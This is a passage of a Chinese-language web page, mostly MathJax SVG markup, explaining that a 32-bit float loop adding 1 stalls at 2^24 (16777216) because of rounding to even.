width="14.986ex" height="2.203ex" role="img" focusable="false" viewBox="0 -891.7 6623.7 973.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1567.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2623.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1000,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(2000,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(2500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(3000,0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(3500,0)"></path></g></g></g></svg></mjx-container></span> 浮点数的<strong>精度有限</strong>，当 <code>x</code>
变得足够大时，<code>x + 1</code>
可能无法被精确表示，导致<strong>舍入误差</strong>。</p>
<p>具体来说：</p>
<ul>
<li>32 位 <code>float</code> 使用 <strong>23 位尾数
</strong>，有效的精度为 <strong>24 位二进制位</strong>。</li>
<li>当 <code>x = 2^{24} = 16777216</code> 时：
<ul>
<li>计算 <code>x + 1 = 16777217</code>，由于 <code>16777217</code>
无法在 <code>float</code> 精度范围内精确表示，它会<strong>被舍入回
16777216</strong>（因为 <code>16777217</code> 与 <code>16777216</code>
距离相等，按“以 0 结尾优先”的规则，舍入回 <code>16777216</code>）。</li>
</ul></li>
<li>由于 <code>x</code> 不再发生变化，循环继续执行但 <code>x</code>
不再增长，最终 <code>x</code> 仍然停留在 <code>16777216</code>。</li>
</ul>
<p>在 <code>2^24</code> 之前，<code>x + 1</code>
<strong>可以被精确表示</strong>，所以加 1 没有舍入误差，一直到
<code>x = 2^24</code> 才开始丢失精度。比如当 <code>x = 2^{24}</code>
时，它的二进制表示如下，注意到为了与24的指数对齐（每乘一个2相当于小数点右移一位），下面的表示有24位的尾数，实际上最后的一位0是不存在的：
<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="33.588ex" height="2.067ex" role="img" focusable="false" viewBox="0 -891.7 14846.1 913.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(2278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(2778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(3278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(3778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(4278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(4778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(5278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(5778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(6278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(6778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(7278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(7778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(8278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(8778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(9278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(9778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(10278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(10778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(11278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(11778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(12278,0)"></path></g><g data-mml-node="mi" transform="translate(12778,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(13556,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container></span></p>
<p>这时，如果我们 加 1（即 x + 1），结果是： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="33.588ex" height="2.067ex" role="img" focusable="false" viewBox="0 -891.7 14846.1 913.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(2278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(2778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(3278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(3778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(4278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(4778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(5278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(5778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(6278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(6778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(7278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(7778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(8278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(8778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(9278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 